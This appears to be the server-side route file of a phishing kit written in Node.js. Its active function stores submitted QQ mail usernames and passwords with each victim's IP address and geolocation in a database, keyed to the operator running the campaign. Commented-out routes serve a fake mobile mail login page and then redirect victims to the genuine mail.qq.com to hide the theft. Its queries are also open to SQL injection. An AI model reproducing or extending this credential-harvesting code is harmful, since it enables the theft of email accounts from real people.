var _ip = require('./../lib/ip.js');
var sql = require('../db/sqlite.js');
var code = require('../lib/incode.js');
var magic = require('../lib/magic.js');
var cwd = process.cwd();
var path = require('path');
module.exports = function (app) {
    function insertData(req, cb) {
        var qq = req.body.u;
        var pwd = req.body.p;
        var userId = req.body.uid;
        var mid = req.body.mid;
        var ip = req.connection.remoteAddress;
        ip = ip.substr(ip.indexOf(':', 3) + 1);
	// ip = req.headers['x-real-ip']
        var insertTime = new Date().getTime().toString();
        var mname, userName, address;
        try {
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
                mname = rows[0].tempName;
                userName = rows[0].userName;
                _ip(ip, function (ip, add) {
                    address = add;
                    sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`, function (err, rows) {
                        cb();
                    });
                });
            });
        } catch (e) {
            res.sendFile(path.join(cwd, '/404.html'));
        }

    };

    // app.get('/m', function (req, res) {
    //     var uidStr = req.headers.host;
    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
    //     uid = code.decode(uid);
    //     res.statusCode = 404;
    //     try {
    //         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
    //             var mid = rows[0].tempId;
    //             var bgUrl = rows[0].bgUrl;
    //             var url = rows[0].url;
    //             res.render('pages/wap_mail.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl });
    //         });
    //     } catch (e) {
    //         res.sendFile(path.join(cwd, '/404.html'));
    //     }
    // });

    // app.post('/k/m', function (req, res) {
    //     var tz = req.body.tz;
    //     var uidStr = req.headers.host;
    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
    //     uid = code.decode(uid);
    //     try {
    //         insertData(req, function () {
    //             sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
    //                 var mid = rows[0].tempId;
    //                 var bgUrl = rows[0].bgUrl;
    //                 var url = rows[0].url;
    //                 if (tz.toString() === '1') {
    //                     return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
    //                 }
    //                 // if (req.device.type === 'phone') {
    //                 //     return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
    //                 // }
    //                 res.render('pages/wap_mail.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl });
    //             });
    //         });
    //     } catch (e) {
    //         res.sendFile(path.join(cwd, '/404.html'));
    //     }

    // });
}
